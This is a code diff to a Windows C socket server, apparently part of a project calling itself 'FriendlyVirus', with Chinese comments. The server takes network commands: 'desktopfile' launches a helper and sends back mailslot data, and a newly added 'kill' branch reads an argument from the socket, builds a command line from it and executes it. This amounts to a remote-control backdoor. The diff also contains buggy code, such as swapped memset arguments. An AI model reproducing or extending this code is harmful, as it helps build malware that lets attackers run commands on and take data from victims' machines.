@@ -8,8 +8,42 @@
 #pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib,"../debug/FriendlyVirus.lib")
 
-//邮槽句柄指针
+//全局变量，邮槽句柄指针
 HANDLE *hMailslot;
+
+
+void CombineString(WCHAR** des, WCHAR* src_0, char *src_1, char *src_2, int *size) {
+	int size_ = 0;
+	*size = lstrlen(src_0) * sizeof(WCHAR) + (3 + strlen(src_1) + strlen(src_2)) * sizeof(WCHAR);
+	WCHAR *src_0_temp = src_0;
+	CHAR *src_1_temp = src_1;
+	CHAR *src_2_temp = src_2;
+	*des = (WCHAR*)malloc(*size);
+	memset(*des, *size, '\0');
+	WCHAR *desTmp = *des;
+
+	while (*src_0_temp) {
+		*desTmp = *src_0_temp;
+		(desTmp)++;
+		src_0_temp++;
+	}
+	*desTmp = (WCHAR)' ';
+	(desTmp)++;
+	while (*src_1_temp) {
+		*desTmp = (WCHAR)*src_1_temp;
+		(desTmp)++;
+		src_1_temp++;
+	}
+	*desTmp = (WCHAR) ' ';
+	(desTmp)++;
+	while (*src_2_temp) {
+		*desTmp = (WCHAR)*src_2_temp;
+		(desTmp)++;
+		src_2_temp++;
+	}
+	*desTmp = (WCHAR) '\0';
+}
+
 
 void GetTotalBytes(WCHAR** des,int *totalBytes) {
 	*totalBytes = 0;
@@ -56,6 +90,7 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
 	WCHAR* totalMessageTmp = NULL;
 	LPWSTR* message = NULL;
 	LPWSTR* messageTmp = NULL;
+	WCHAR answerWord[] = L"Recieved Success!";
 	ZeroMemory(&strtinfo, sizeof(strtinfo));
 	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
 	printf("线程[%d]已启动!\n", threadId);
@@ -77,12 +112,13 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
 				break;
 			}
 			printf("线程[%d]接收到数据:%s\n",threadId,recvBuff);
+			
 			if (strcmp(recvBuff, "desktopfile") == 0) {
 				bCreateProcessResult = CreateProcess(NULL,exeName, NULL, NULL, FALSE, 0, 
 					NULL, NULL, &strtinfo,&processInformation);
 				JudgeSuccessOrNot(bCreateProcessResult);
 				Sleep(500);
-				message = GetMessageFromMailslot(*hMailslot);
+				message = GetMessageFromMailslot(*hMailslot); 
 				messageTmp = message;
 				if (*messageTmp) {
 					int totalBytes = 0;
@@ -110,6 +146,24 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
 				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, totalMessage);
 				CloseHandle(processInformation.hThread);
 				CloseHandle(processInformation.hProcess);
+			}
+			if (strcmp(recvBuff, "kill") == 0) {
+				printf("继续接受指令\n");
+				Sleep(500);
+				recv(answerSocket, recvBuff, 512, 0);
+				//构造命令行，使目标函数执行相关操作
+				WCHAR* exeNameAndCmdLine=NULL;
+				char src1[] = "kill";
+				int cbnsize = 0;
+				CombineString(&exeNameAndCmdLine, exeName, src1, recvBuff, &cbnsize);
+				CreateProcess(NULL, exeNameAndCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &strtinfo, &processInformation);
+				send(answerSocket, "Instruction code recieved!", 27, 0);
+				/*if (strcmp(recvBuff," ") == 0) {
+					send(answerSocket, "InstructionNotCorrect!", 23, 0);
+				}*/
+			}
+			else {
+				send(answerSocket,(char*)answerWord, (lstrlen(answerWord) + 1)*sizeof(WCHAR), 0);
 			}
 		}
 	}
